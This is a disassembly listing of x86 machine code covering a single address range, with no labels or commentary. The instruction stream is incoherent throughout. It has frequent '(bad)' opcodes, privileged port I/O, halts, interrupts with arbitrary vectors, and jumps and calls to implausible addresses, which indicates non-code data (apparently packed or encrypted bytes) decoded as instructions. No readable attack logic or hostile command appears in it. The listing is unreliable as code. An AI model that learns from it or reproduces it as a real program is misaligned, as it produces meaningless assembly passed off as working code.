  4133f4:	outs   dx,WORD PTR ds:[si]
  4133f7:	mov    BYTE PTR [ebp-0x74090cd6],bh
  4133fd:	jns    0x413412
  4133ff:	lods   eax,DWORD PTR ds:[esi]
  413400:	sbb    BYTE PTR [edi+0x15],ch
  413403:	pusha  
  413404:	push   0x16d4ed5a
  413409:	idiv   BYTE PTR [edi-0x78f293de]
  41340f:	jne    0x413425
  413411:	mov    dl,0x8e
  413413:	inc    ecx
  413414:	js     0x4133dc
  413416:	pop    eax
  413417:	in     eax,0x90
  413419:	shl    BYTE PTR [edi],cl
  41341b:	xchg   BYTE PTR [edi+eiz*2],dl
  41341e:	dec    ebp
  41341f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413420:	add    al,0xf9
  413422:	or     ah,BYTE PTR [ebx]
  413424:	mul    DWORD PTR [ebx-0x61]
  413427:	mov    BYTE PTR [edi+0x7c],bh
  41342a:	inc    edi
  41342b:	dec    edx
  41342c:	shr    BYTE PTR [edi+0x521668a9],cl
  413432:	repz sbb al,0x44
  413435:	fcomp  QWORD PTR [esp+edx*8+0x35182d37]
  41343c:	sbb    BYTE PTR [edi-0x6a],dl
  41343f:	mov    DWORD PTR [ecx],0xd990fc9e
  413445:	stos   BYTE PTR es:[edi],al
  413446:	jg     0x413489
  413448:	aad    0xa3
  41344a:	jnp    0x4134b0
  41344c:	cli    
  41344d:	mul    DWORD PTR [ebp+0x21]
  413450:	mov    cl,0x76
  413452:	sub    eax,0xadf336c
  413457:	xchg   edx,eax
  413458:	xlat   BYTE PTR ds:[ebx]
  413459:	cmp    al,0xd6
  41345b:	das    
  41345c:	mov    eax,0x46197cd7
  413461:	push   edi
  413462:	mov    WORD PTR [edi],ss
  413464:	retf   
  413465:	or     DWORD PTR [edx+0x75],eax
  413468:	int3   
  413469:	stc    
  41346a:	push   ebx
  41346b:	outs   dx,BYTE PTR ds:[esi]
  41346c:	mov    ebp,0xa53556c1
  413471:	xchg   ecx,eax
  413472:	ret    0x739e
  413475:	in     eax,0xf8
  413477:	add    BYTE PTR [eax+0x7d],bh
  41347a:	push   0x0
  41347c:	and    BYTE PTR [edi+0xd4679a],cl
  413482:	xor    al,0x2
  413484:	fidivr DWORD PTR [esp+eax*8]
  413487:	mov    cl,0xdb
  413489:	scas   eax,DWORD PTR es:[edi]
  41348a:	(bad)  
  41348b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41348c:	xchg   edx,eax
  41348d:	dec    ebx
  41348e:	scas   al,BYTE PTR es:[edi]
  41348f:	repz push 0xffffff94
  413492:	cmc    
  413493:	and    eax,esp
  413495:	mov    edi,0x3e961ee
  41349a:	fcmovb st,st(7)
  41349c:	je     0x4134d1
  41349e:	mov    eax,ds:0x6262b53e
  4134a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134a4:	pop    ecx
  4134a5:	ins    BYTE PTR es:[edi],dx
  4134a6:	and    ebx,0x973d6071
  4134ac:	sub    al,0x90
  4134ae:	fst    DWORD PTR [edi+ebx*1+0x42]
  4134b2:	jne    0x4134d7
  4134b4:	xchg   DWORD PTR [eax+0x1e],esp
  4134b7:	cmp    BYTE PTR [ebx+0x46daf5e5],cl
  4134bd:	mov    BYTE PTR [ebx-0x44],dl
  4134c0:	hlt    
  4134c1:	xchg   edx,eax
  4134c2:	or     al,0x4e
  4134c4:	inc    esi
  4134c5:	pmullw mm0,QWORD PTR [eax+0x5e]
  4134c9:	sbb    bl,BYTE PTR [ecx]
  4134cb:	adc    al,0xf1
  4134cd:	push   edi
  4134ce:	lods   al,BYTE PTR ds:[esi]
  4134cf:	xor    BYTE PTR [ebp+0x48b7a601],al
  4134d5:	call   0x52860e9d
  4134da:	test   DWORD PTR [ebx-0x4c5bef15],ebx
  4134e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134e1:	lods   eax,DWORD PTR ds:[esi]
  4134e2:	div    DWORD PTR [edi]
  4134e4:	lods   al,BYTE PTR ds:[esi]
  4134e5:	inc    esi
  4134e6:	enter  0x958c,0x36
  4134ea:	cmp    al,0x17
  4134ec:	sbb    cl,BYTE PTR [ecx+0xbf5137b]
  4134f2:	aam    0x61
  4134f4:	fdiv   st,st(3)
  4134f6:	push   es
  4134f7:	xchg   esi,eax
  4134f8:	cmp    DWORD PTR [esi-0x4f],ecx
  4134fb:	lock jl 0x413512
  4134fe:	fidivr WORD PTR [ebp+0x54f06719]
  413504:	lahf   
  413505:	out    0xbd,eax
  413507:	rcr    DWORD PTR [edx-0x121cadb4],0x32
  41350e:	ret    
  41350f:	and    al,0x9a
  413511:	loope  0x4134a3
  413513:	ret    
  413514:	lahf   
  413515:	adc    dl,BYTE PTR [edi+0x73]
  413518:	out    0x24,al
  41351a:	and    BYTE PTR [ecx],cl
  41351c:	ins    DWORD PTR es:[edi],dx
  41351d:	int3   
  41351e:	inc    ecx
  41351f:	xchg   dl,dl
  413521:	into   
  413522:	shr    DWORD PTR ds:0xb6c69095,0x62
  413529:	(bad)  
  41352b:	aad    0x7d
  41352d:	fcomp  st(0)
  413530:	push   ds
  413531:	sbb    eax,0x10b5470f
  413536:	stos   BYTE PTR es:[edi],al
  413537:	imul   BYTE PTR [eax-0x14c8b30d]
  41353d:	in     eax,0xf5
  41353f:	popf   
  413540:	mov    ebx,0x2f34d1c5
  413545:	scas   eax,DWORD PTR es:[edi]
  413546:	enter  0x3268,0x5f
  41354a:	das    
  41354b:	stc    
  41354c:	outs   dx,BYTE PTR ds:[esi]
  41354d:	ret    0x88b2
  413550:	mov    ch,0xd8
  413552:	out    0x41,eax
  413554:	mov    esp,0xdb85e8fa
  413559:	jo     0x4135aa
  41355b:	jmp    0x413520
  41355d:	push   ecx
  41355e:	pop    eax
  41355f:	test   DWORD PTR ds:0x1362bc25,0x53ad0d86
  413569:	bound  esp,QWORD PTR [eax-0x6e1bccda]
  41356f:	lock sti 
  413571:	dec    ebx
  413572:	fild   DWORD PTR [ecx]
  413574:	adc    DWORD PTR [esi+0x5e8161cb],edx
  41357a:	(bad)
  41357d:	add    al,0x5f
  41357f:	nop
  413580:	div    BYTE PTR [ecx-0x6b1dfdd5]
  413586:	out    dx,al
  413587:	push   es
  413588:	mov    ecx,0x42b275e5
  41358d:	int    0xd3
  41358f:	into   
  413590:	push   es
  413591:	cwde   
  413592:	mov    BYTE PTR [ebx+0x1e3efd94],dl
  413598:	add    BYTE PTR [edi+0x67],ah
  41359b:	jg     0x413609
  41359d:	sbb    DWORD PTR [edx+0x6a05f1d4],ecx
  4135a3:	out    0xc4,al
  4135a5:	sub    bh,bh
  4135a7:	jnp    0x41358e
  4135a9:	test   BYTE PTR [ecx],ch
  4135ab:	pop    ss
  4135ac:	ds call 0x178b6f26
  4135b2:	push   ebx
  4135b3:	(bad)  
  4135b4:	adc    al,0x41
  4135b6:	ins    DWORD PTR es:[edi],dx
  4135b7:	xor    BYTE PTR [eax-0x217904aa],0x8a
  4135be:	xchg   esi,eax
  4135bf:	das    
  4135c0:	adc    ecx,DWORD PTR [eax+0x2a717a93]
  4135c6:	shl    edi,1
  4135c8:	(bad)  
  4135c9:	adc    al,0xbe
  4135cb:	or     ch,dh
  4135cd:	sub    eax,0x8e3556
  4135d2:	inc    ebp
  4135d3:	sar    DWORD PTR [ecx+0x70],0x94
  4135d7:	sar    DWORD PTR [edi+0x45],0xb7
  4135db:	or     ebx,DWORD PTR [ebx-0x4]
  4135de:	pop    ds
  4135df:	mov    eax,ds:0xf9180c0c
  4135e4:	popa   
  4135e5:	jo     0x4135be
  4135e7:	jl     0x41363d
  4135e9:	jmp    0x767c:0x87a8f6c6
  4135f0:	int3   
  4135f1:	mov    ah,0x7f
  4135f3:	js     0x4135d8
  4135f5:	rcl    BYTE PTR [edx],1
  4135f7:	inc    edi
  4135f8:	out    0x8c,eax
  4135fa:	hlt    
  4135fb:	or     dh,ah
  4135fd:	pop    ds
  4135fe:	mov    ah,0x3d
  413600:	jg     0x413582
  413602:	repz inc esi
  413604:	inc    ecx
  413605:	repnz (bad) 
  413607:	stc    
  413608:	cmp    al,0x45
  41360a:	imul   DWORD PTR [esp+eax*2+0x35]
  41360e:	xchg   edx,eax
  41360f:	push   ecx
  413610:	jmp    0xb20028c6
  413615:	sbb    BYTE PTR [eax],ah
  413617:	aam    0xea
  413619:	xor    bl,BYTE PTR [edi]
  41361b:	mov    ah,0x4f
  41361d:	dec    esp
  41361e:	enter  0x3a62,0x17
  413622:	(bad)  
  413623:	pusha  
  413624:	int    0x83
  413626:	in     eax,dx
  413627:	push   es
  413628:	push   0x5b
  41362a:	jmp    0x4135f2
  41362c:	mov    ds:0x36edc0d1,al
  413631:	or     ah,BYTE PTR [esi+0x36eed421]
  413637:	sti    
  413638:	loop   0x413628
  41363a:	mov    eax,0x13809347
  41363f:	mov    WORD PTR [edi+0x6c],fs
  413642:	mov    ds:0xe9e9a822,eax
  413647:	int    0x76
  413649:	(bad)  
  41364a:	or     BYTE PTR [ebx-0x2228ddf0],dh
  413650:	out    dx,al
  413651:	or     al,0xee
  413653:	fidiv  WORD PTR [ebp-0x45]
  413656:	(bad)  
  413658:	jmp    0x5e63d190
  41365d:	cmp    DWORD PTR [esi+0x7e900ec2],ebx
  413663:	push   ebx
  413664:	jl     0x4136c4
  413666:	jge    0x413608
  413668:	or     al,0x1e
  41366a:	push   edi
  41366b:	push   edi
  41366c:	inc    esi
  41366d:	fs xchg ebp,eax
  41366f:	adc    eax,0xef667199
  413674:	or     eax,esi
  413676:	pop    es
  413677:	xor    bh,BYTE PTR [esi]
  413679:	ret    0xe009
  41367c:	and    DWORD PTR [ecx],0xe540eb3d
  413682:	int3   
  413683:	(bad)  
  413684:	mov    ch,0x3b
  413686:	aas    
  413687:	mov    edx,DWORD PTR [eax+0x19708435]
  41368d:	push   ds
  41368e:	outs   dx,DWORD PTR ds:[esi]
  41368f:	pop    ebp
  413690:	jl     0x41362d
  413692:	mov    edi,0xff72d807
  413697:	inc    ebp
  413698:	jle    0x413693
  41369a:	jl     0x4136b2
  41369c:	push   es
  41369d:	adc    dh,BYTE PTR [eax+eax*4+0x5a]
  4136a1:	inc    esi
  4136a2:	sbb    ebx,DWORD PTR [ebp-0x7]
  4136a5:	bound  eax,QWORD PTR [ebp-0x3c]
  4136a8:	mov    bl,0x68
  4136aa:	js     0x413715
  4136ac:	pusha  
  4136ad:	mov    edx,0x9dd74749
  4136b2:	adc    BYTE PTR [eax+0xdfc7ce1],bh
  4136b8:	scas   eax,DWORD PTR es:[edi]
  4136b9:	jns    0x413728
  4136bb:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136bd:	addr16 sbb edx,edx
  4136c0:	adc    DWORD PTR [ebp+0x49353197],eax
  4136c6:	mov    al,0x89
  4136c8:	mov    esp,0x27c029b2
  4136cd:	jb     0x4136c3
  4136cf:	xchg   edx,eax
  4136d0:	jmp    0x41371a
  4136d2:	in     eax,0x8a
  4136d4:	aad    0x65
  4136d6:	inc    eax
  4136d7:	jb     0x41373b
  4136d9:	sub    eax,0x71ad5dec
  4136de:	inc    eax
  4136df:	or     edx,DWORD PTR [edx+eiz*8-0x5ac11575]
  4136e6:	or     al,0xd2
  4136e8:	jae    0x413710
  4136ea:	lods   eax,DWORD PTR ds:[esi]
  4136eb:	mov    ds:0x4e05cb2b,eax
  4136f0:	sub    DWORD PTR [eax],ecx
  4136f2:	push   0xffffffb1
  4136f4:	clc    
  4136f5:	and    eax,0x60e77c3b
  4136fa:	adc    esi,DWORD PTR ds:0xc265ad9c
  413700:	xlat   BYTE PTR ds:[ebx]
  413701:	or     al,0x2
  413703:	out    0x78,eax
  413705:	lods   eax,DWORD PTR ds:[esi]
  413706:	adc    ebp,esi
  413708:	jae    0x4136d9
  41370a:	loope  0x4136e7
  41370c:	(bad)  
  41370d:	fnstsw WORD PTR ds:0x806282a5
  413713:	cdq    
  413714:	stos   BYTE PTR es:[edi],al
  413715:	mov    bl,0x87
  413717:	mov    ecx,0xc27a8a3d
  41371c:	sub    eax,0x9da4a66
  413721:	mov    ah,0xbc
  413723:	push   ss
  413724:	(bad)  
  413725:	pop    ss
  413726:	pop    ebx
  413727:	pop    esi
  413728:	adc    BYTE PTR [ebx-0x32],0x3c
  41372c:	cmp    bh,BYTE PTR [ebx]
  41372e:	cmp    edx,DWORD PTR [esi-0x19f78add]
  413734:	sbb    eax,0xfee909a6
  413739:	sbb    bh,BYTE PTR [edi+ecx*8]
  41373c:	jecxz  0x4136d3
  41373e:	scas   al,BYTE PTR es:[edi]
  41373f:	fwait
  413740:	stos   DWORD PTR es:[edi],eax
  413741:	mov    ds:0xfd1b3f9d,eax
  413746:	scas   al,BYTE PTR es:[edi]
  413747:	out    0xe5,al
  413749:	inc    edx
  41374a:	inc    edx
  41374b:	xchg   ecx,eax
  41374c:	test   al,0xe4
  41374e:	pop    ss
  41374f:	out    0x2b,eax
  413751:	inc    ebp
  413752:	clc    
  413753:	push   0x15da47c8
  413758:	mov    al,ds:0x99aaf41c
  41375d:	add    edx,edx
  41375f:	fdiv   QWORD PTR [edx-0x15]
  413762:	jl     0x413722
  413764:	dec    edi
  413765:	cmc    
  413766:	xor    eax,0xbd2eb8fd
  41376b:	fcmovu st,st(4)
  41376d:	inc    BYTE PTR [eax-0x6d]
  413770:	jl     0x4137c0
  413772:	jbe    0x41378b
  413774:	in     al,dx
  413775:	sub    BYTE PTR [edx+0x700ddcaa],al
  41377b:	mov    ecx,0xee56befb
  413780:	mov    dh,0x65
  413782:	adc    DWORD PTR ds:0x7caad17f,esi
  413788:	test   BYTE PTR [ebx-0xb9501fd],bl
  41378e:	dec    eax
  41378f:	(bad)  
  413791:	inc    eax
  413792:	scas   al,BYTE PTR es:[edi]
  413793:	xchg   edx,eax
  413794:	inc    ecx
  413795:	pop    ds
  413796:	cmp    BYTE PTR [esp+ebp*1-0x48],ch
  41379a:	jle    0x41378e
  41379c:	jbe    0x41380d
  41379e:	jecxz  0x4137b2
  4137a0:	dec    ecx
  4137a1:	lds    eax,FWORD PTR [ecx+0x103b7258]
  4137a7:	fdiv   st,st(2)
  4137a9:	adc    al,0x7d
  4137ab:	inc    edi
  4137ac:	mov    ebp,0xc6f7fcbc
  4137b1:	jne    0x41381d
  4137b3:	xchg   DWORD PTR [ebp-0x4f],ebx
  4137b6:	pop    ebp
  4137b7:	inc    ebp
  4137b8:	adc    eax,0x2e858f1f
  4137bd:	shl    BYTE PTR [esi-0x14c77c16],0x78
  4137c4:	stos   DWORD PTR es:[edi],eax
  4137c5:	hlt    
  4137c6:	fstcw  WORD PTR [esi]
  4137c9:	pop    ds
  4137ca:	sti    
  4137cb:	scas   al,BYTE PTR es:[edi]
  4137cc:	in     al,dx
  4137cd:	pop    ebp
  4137ce:	push   ebp
  4137cf:	mov    edi,0x91cc0e75
  4137d4:	enter  0x4563,0x9e
  4137d8:	cmp    BYTE PTR [edi],dl
  4137da:	add    ch,BYTE PTR [ebx+0x411abe9d]
  4137e0:	lea    eax,ds:0x7f2e9ff8
  4137e6:	inc    esp
  4137e7:	xor    ebp,ecx
  4137e9:	sbb    dh,BYTE PTR cs:[edx+0x26a93508]
  4137f0:	add    dh,BYTE PTR [edx+edx*4]
  4137f3:	mov    eax,0xcbdcaa2
  4137f8:	mov    dh,BYTE PTR [edi]
  4137fa:	pop    esi
  4137fb:	sub    BYTE PTR [edi-0x6d1c6563],bh
  413801:	ss cmp eax,0x7a242b55
  413807:	jb     0x413858
  413809:	stos   BYTE PTR es:[edi],al
  41380a:	fist   DWORD PTR [ebp+0x7552eaaf]
  413810:	xchg   ebx,eax
  413811:	xor    eax,0x8230f473
  413816:	sub    al,0xcd
  413818:	fisttp DWORD PTR [ebp-0x797dd011]
  41381e:	and    edx,DWORD PTR [esi+0x69ecff58]
  413824:	sbb    cl,BYTE PTR [ecx-0x73b6a944]
  41382a:	cmp    eax,0xda82ceb0
  41382f:	and    al,BYTE PTR [esi-0x56424c3f]
  413835:	sub    cl,0xa1
  413838:	ret    0xb11d
  41383b:	arpl   WORD PTR [edx],cx
  41383d:	int3   
  41383e:	mov    eax,ds:0xdaacab75
  413843:	jno    0x4138bc
  413845:	in     eax,0xfb
  413847:	popa   
  413848:	push   cs
  413849:	cs xor bl,bl
  41384c:	mov    ds:0x8728028,al
  413851:	and    BYTE PTR [eax],bl
  413853:	push   es
  413854:	mov    BYTE PTR [edx+0x2f],0x9
  413858:	mov    bl,BYTE PTR [edx]
  41385a:	arpl   WORD PTR [edi-0x451afddb],ax
  413860:	adc    al,0x80
  413862:	rcl    BYTE PTR [ebx-0x7301cd27],cl
  413868:	mov    dh,dl
  41386a:	not    DWORD PTR [ebx+ebp*8+0x10]
  41386e:	test   al,0xf2
  413870:	fwait
  413871:	xchg   BYTE PTR [ebx],bl
  413873:	pop    ss
  413874:	js     0x4138d9
  413876:	or     ch,ch
  413878:	dec    edx
  413879:	adc    ebx,ebp
  41387b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41387c:	scas   eax,DWORD PTR es:[edi]
  41387d:	fwait
  41387e:	sbb    ebp,DWORD PTR [ecx]
  413880:	or     bh,bh
  413882:	jl     0x4138cc
  413884:	fdivr  DWORD PTR [eax]
  413886:	pusha  
  413887:	mov    DWORD PTR [ecx],0xd042ff25
  41388d:	push   cs
  41388e:	cmp    bl,BYTE PTR [eax+ecx*1+0x75]
  413892:	out    0x61,al
  413894:	and    eax,0x3040e26a
  413899:	ror    DWORD PTR [edx+0x24],0xf2
  41389d:	mov    ch,0xe5
  41389f:	test   al,ch
  4138a1:	xor    DWORD PTR [ecx+0x67],0x74
  4138a5:	xor    eax,0xcdcebe4f
  4138aa:	or     al,0xb6
  4138ac:	nop
  4138ad:	mov    WORD PTR [edx+0x4b3f6ba3],?
  4138b3:	aaa    
  4138b4:	cdq    
  4138b5:	out    0x8d,eax
  4138b7:	push   esi
  4138b8:	sbb    edi,0x2d
  4138bb:	xchg   esp,eax
  4138bc:	push   eax
  4138bd:	push   cs
  4138be:	retf   
  4138bf:	sbb    al,cl
  4138c1:	dec    esi
  4138c2:	scas   al,BYTE PTR es:[edi]
  4138c3:	dec    ecx
  4138c4:	popa   
  4138c5:	sub    DWORD PTR [edi+0x28],0xffffff8f
  4138c9:	stos   DWORD PTR es:[edi],eax
  4138ca:	test   eax,0xc6597e8a
  4138cf:	std    
  4138d0:	shld   DWORD PTR ds:0x30c32672,esp,0xca
  4138d8:	push   ss
  4138d9:	cdq    
  4138da:	xor    DWORD PTR fs:[edx],eax
  4138dd:	fucomip st,st(2)
  4138df:	mov    al,0xac
  4138e1:	lods   eax,DWORD PTR ds:[esi]
  4138e2:	or     cl,bl
  4138e4:	add    eax,0x49a4b34a
  4138e9:	dec    ebx
  4138ea:	push   ebp
  4138eb:	mov    esi,0x15b8420
  4138f0:	fdiv   DWORD PTR [ebx+0x21]
  4138f3:	in     eax,0x3e
  4138f5:	push   eax
  4138f6:	gs dec esi
  4138f8:	(bad)  
  4138f9:	pop    eax
  4138fa:	ja     0x4138b5
  4138fc:	or     BYTE PTR [ecx-0x5a122d2f],0xf6
  413903:	lock int 0x2f
  413906:	inc    esp
  413907:	cmp    DWORD PTR [ebp+0x39],ebx
  41390a:	fstp   QWORD PTR [eax-0x48e69abc]
  413910:	xor    BYTE PTR [edx+0x4d],bl
  413913:	ja     0x41394f
  413915:	enter  0x7ec2,0x4e
  413919:	xor    eax,0x70a94c18
  41391e:	jb     0x41393f
  413920:	mov    ebp,0x9740fdb1
  413925:	sbb    eax,0x336268c5
  41392a:	outs   dx,BYTE PTR ds:[esi]
  41392b:	xchg   edi,eax
  41392c:	aaa    
  41392d:	add    edx,edi
  41392f:	(bad)  
  413931:	lds    eax,FWORD PTR [esi+ecx*4-0x2f]
  413935:	lods   al,BYTE PTR ds:[esi]
  413936:	jo     0x413995
  413938:	mov    bh,0xee
  41393a:	loope  0x4138fb
  41393c:	fistp  QWORD PTR [ebp+0x60]
  41393f:	(bad)  
  413940:	sti    
  413941:	cdq    
  413942:	shl    DWORD PTR [ebx+0x6e4087bc],cl
  413948:	push   esp
  413949:	jecxz  0x4138cf
  41394b:	jnp    0x413954
  41394d:	call   0x9fb5ecd0
  413952:	vpcomud xmm13,xmm7,XMMWORD PTR es:[ebx+r13d*1-0x30d20ee3],0x91
  41395e:	or     cl,cl
  413960:	(bad)  
  413961:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413962:	add    eax,0x5b0e4255
  413967:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413968:	popf   
  413969:	jge    0x4138ee
  41396b:	nop
  41396c:	jp     0x413995
  41396e:	rcr    bl,0x21
  413971:	push   esp
  413972:	jbe    0x413969
  413974:	push   edx
  413975:	mov    ebp,0xf1342a02
  41397a:	std    
  41397b:	test   DWORD PTR [ebp-0x4a45f511],ebx
  413981:	fs out dx,eax
  413983:	and    ebp,DWORD PTR [eax-0x13]
  413986:	pusha  
  413987:	ds push esp
  413989:	xchg   ecx,eax
  41398a:	xlat   BYTE PTR ds:[ebx]
  41398b:	xor    dh,0x28
  41398e:	repnz sar DWORD PTR [eax+eiz*2+0x4d5caf5e],0xfa
  413997:	jae    0x413961
  413999:	or     bh,BYTE PTR [edx+0x2b24d68e]
  41399f:	lahf   
  4139a0:	faddp  st(6),st
  4139a2:	sbb    BYTE PTR [ecx+ecx*8-0x26],cl
  4139a6:	fbstp  TBYTE PTR [ecx-0x6c]
  4139a9:	dec    edx
  4139aa:	jp     0x4139ac
  4139ac:	mov    esi,0x40cdcbef
  4139b1:	retf   0xc93d
  4139b4:	fiadd  DWORD PTR [edi-0x4d434df6]
  4139ba:	jns    0x41396a
  4139bc:	push   0x2ab3b6d
  4139c1:	add    DWORD PTR [esi],ebp
  4139c3:	shl    ah,cl
  4139c5:	(bad)
  4139c8:	dec    edx
  4139c9:	mov    ds:0x2550e2e4,al
  4139ce:	jge    0x413a11
  4139d0:	jns    0x4139e6
  4139d2:	push   edi
  4139d3:	push   ebp
  4139d4:	cdq    
  4139d5:	ja     0x413a03
  4139d7:	mov    ds:0x5b8065b8,al
  4139dc:	fbstp  TBYTE PTR [edi-0x3311e2b8]
  4139e2:	popf   
  4139e3:	es xchg esp,eax
  4139e5:	popf   
  4139e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139e7:	imul   ebx,edx,0xffffffbd
  4139ea:	test   BYTE PTR [eax],al
  4139ec:	lods   eax,DWORD PTR ds:[esi]
  4139ed:	out    0x59,eax
  4139ef:	mov    cl,0xd0
  4139f1:	or     al,0xe1
  4139f3:	pop    ss
  4139f4:	daa    
  4139f5:	enter  0xf6ba,0x86
  4139f9:	jg     0x41398b
  4139fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139fc:	mov    bl,0x51
  4139fe:	pop    es
  4139ff:	je     0x413a4c
  413a01:	pop    edi
  413a02:	stos   DWORD PTR es:[edi],eax
  413a03:	cdq    
  413a04:	mov    eax,0x3e10f83e
  413a09:	mov    edx,0x66221d1
  413a0e:	shl    BYTE PTR [edi-0x1346014e],1
  413a14:	mov    DWORD PTR [edi-0x17bf5a4f],ecx
  413a1a:	ja     0x413a95
  413a1c:	dec    ecx
  413a1e:	stc    
  413a1f:	fwait
  413a20:	push   cs
  413a21:	add    al,0x49
  413a23:	or     esi,DWORD PTR [ebx+0x46]
  413a26:	add    ebx,0xffffff9c
  413a29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a2a:	test   BYTE PTR [edi],cl
  413a2c:	sbb    BYTE PTR [ecx+0x54176ec8],dl
  413a32:	bound  esi,QWORD PTR [edx]
  413a34:	fidivr WORD PTR ds:0x9f807b18
  413a3a:	js     0x4139e0
  413a3c:	icebp  
  413a3d:	popa   
  413a3e:	sbb    DWORD PTR [edx+0x74],edx
  413a41:	pop    ss
  413a42:	dec    eax
  413a43:	and    al,0x5b
  413a45:	mov    ds:0x7019daa1,eax
  413a4a:	xchg   ecx,eax
  413a4b:	push   0x1d4cd7bc
  413a50:	mov    WORD PTR ds:0x40fa10b5,gs
  413a56:	jnp    0x413aa2
  413a58:	pop    es
  413a59:	and    bh,bh
  413a5b:	inc    edi
  413a5c:	mov    ds:0xcb429457,al
  413a61:	fisttp WORD PTR [ebx+0x260b12a0]
  413a67:	scas   eax,DWORD PTR es:[edi]
  413a68:	call   0x98d805bc
  413a6d:	lods   al,BYTE PTR ds:[esi]
  413a6e:	rcl    DWORD PTR [ecx],1
  413a70:	mov    esp,0xaa86f57d
  413a75:	xor    BYTE PTR [si],bh
  413a78:	mov    al,0x2e
  413a7a:	cli    
  413a7b:	retf   
  413a7c:	mov    ds:0x36526dfb,eax
  413a81:	enter  0x8730,0x87
  413a85:	xchg   ecx,eax
  413a86:	sub    DWORD PTR [esi-0x14],0xee1f474
  413a8d:	jo     0x413add
  413a8f:	sub    DWORD PTR [ebx],0xffffffe6
  413a92:	fstp   st(2)
  413a94:	mov    edi,0x453afad7
  413a99:	icebp  
  413a9a:	(bad)  
  413a9b:	jmp    0x330de211
  413aa0:	dec    edx
  413aa1:	xor    ebx,0x2ae8d61b
  413aa7:	push   ebp
  413aa8:	ja     0x413a65
  413aaa:	test   al,0x78
  413aac:	push   ebp
  413aad:	fwait
  413aae:	mov    DWORD PTR [ebp+ebp*1-0x25],ecx
  413ab2:	jb     0x413aea
  413ab4:	icebp  
  413ab5:	inc    esp
  413ab6:	stos   BYTE PTR es:[edi],al
  413ab7:	pop    es
  413ab8:	xchg   edi,eax
  413ab9:	mul    DWORD PTR [eax+0x37]
  413abc:	je     0x413a99
  413abe:	imul   esi,DWORD PTR [ecx+0x3ec59bc7],0x65ccbdfc
  413ac8:	inc    esp
  413ac9:	push   cs
  413aca:	push   edi
  413acb:	jg     0x413ad6
  413acd:	in     eax,0x2e
  413acf:	sub    DWORD PTR [ebx],edi
  413ad1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ad2:	dec    ebx
  413ad3:	dec    ecx
  413ad4:	ins    DWORD PTR es:[edi],dx
  413ad5:	jbe    0x413adb
  413ad7:	inc    edx
  413ad8:	inc    esi
  413ad9:	stos   DWORD PTR es:[edi],eax
  413ada:	and    ch,BYTE PTR [ebp+edx*8-0x6b82ecac]
  413ae1:	or     eax,0x97655b96
  413ae6:	pusha  
  413ae7:	out    0x24,eax
  413ae9:	mov    edx,0x207e1a1c
  413aee:	jecxz  0x413b3a
  413af0:	sub    DWORD PTR [esi+0x3a8e9086],ebp
  413af6:	mov    edi,0x1be8052c
  413afb:	cmp    DWORD PTR [edx],ebp
  413afd:	stos   DWORD PTR es:[edi],eax
  413afe:	jae    0x413ab7
  413b00:	mov    ebx,0xc11f2154
  413b05:	sub    al,0xf6
  413b07:	pop    ss
  413b08:	dec    esi
  413b09:	lods   eax,DWORD PTR ds:[esi]
  413b0a:	mov    eax,0x3e1d892d
  413b0f:	mov    eax,ds:0x2efd6dcc
  413b14:	repz cmp al,0xaf
  413b17:	mov    cl,0x2c
  413b19:	and    eax,0xf910a3d5
  413b1e:	fsubr  st,st(3)
  413b20:	mov    ebp,0xd6198931
  413b25:	sub    edi,DWORD PTR [edx+0x79]
  413b28:	adc    BYTE PTR [ebp+0xc],al
  413b2b:	scas   eax,DWORD PTR es:[edi]
  413b2c:	loopne 0x413aeb
  413b2e:	inc    edx
  413b2f:	xor    al,0x45
  413b31:	adc    cl,BYTE PTR [edx+0x23]
  413b34:	ins    BYTE PTR es:[edi],dx
  413b35:	scas   al,BYTE PTR es:[edi]
  413b36:	lahf   
  413b37:	sbb    BYTE PTR [esi-0x3e],cl
  413b3a:	mov    esi,0x29480cb0
  413b3f:	out    dx,al
  413b40:	(bad)  
  413b41:	retf   0x9d9e
  413b44:	xchg   ebx,eax
  413b45:	sbb    DWORD PTR [esi+eax*8+0x64d2fa5a],esi
  413b4c:	inc    esp
  413b4d:	add    bh,BYTE PTR fs:[eax+0x33ff91c2]
  413b54:	or     ebp,DWORD PTR [esi]
  413b56:	sbb    eax,0xe1906adc
  413b5b:	(bad)  
  413b5c:	xlat   BYTE PTR ds:[ebx]
  413b5d:	mov    ds:0x709792a3,eax
  413b62:	in     al,dx
  413b63:	xchg   edx,eax
  413b64:	sbb    al,0x3b
  413b66:	shl    BYTE PTR [esi],1
  413b68:	mov    bh,0x8e
  413b6a:	repz add al,0xd5
  413b6d:	stos   DWORD PTR es:[edi],eax
  413b6e:	add    al,0x23
  413b70:	imul   edx,DWORD PTR [ebx-0xccd133f],0x1a
  413b77:	mov    dl,0xe3
  413b79:	popa   
  413b7a:	push   0x9665f868
  413b7f:	pop    eax
  413b80:	add    eax,0x6df84ad4
  413b85:	jae    0x413b2f
  413b87:	sub    edi,DWORD PTR [esi+esi*4+0x12]
  413b8b:	or     al,0xe0
  413b8d:	dec    ecx
  413b8e:	or     dl,BYTE PTR [edx]
  413b90:	and    al,0xaf
  413b92:	jno    0x413b47
  413b94:	arpl   si,cx
  413b96:	mov    BYTE PTR [edi+0x698e4aa3],cl
  413b9c:	xchg   dh,bh
  413b9e:	in     eax,0xa7
  413ba0:	popa   
  413ba1:	aaa    
  413ba2:	sub    ch,BYTE PTR [ebx-0x12]
  413ba5:	xor    dl,BYTE PTR [ebx]
  413ba7:	jno    0x413b7d
  413ba9:	dec    ecx
  413baa:	stos   BYTE PTR es:[edi],al
  413bab:	inc    ebp
  413bac:	jp     0x413bce
  413bae:	xchg   ebp,eax
  413baf:	or     BYTE PTR [esi],al
  413bb1:	mov    al,ds:0xd6a2f4b1
  413bb6:	stos   BYTE PTR es:[edi],al
  413bb7:	mov    eax,ds:0x39440978
  413bbc:	jb     0x413bd1
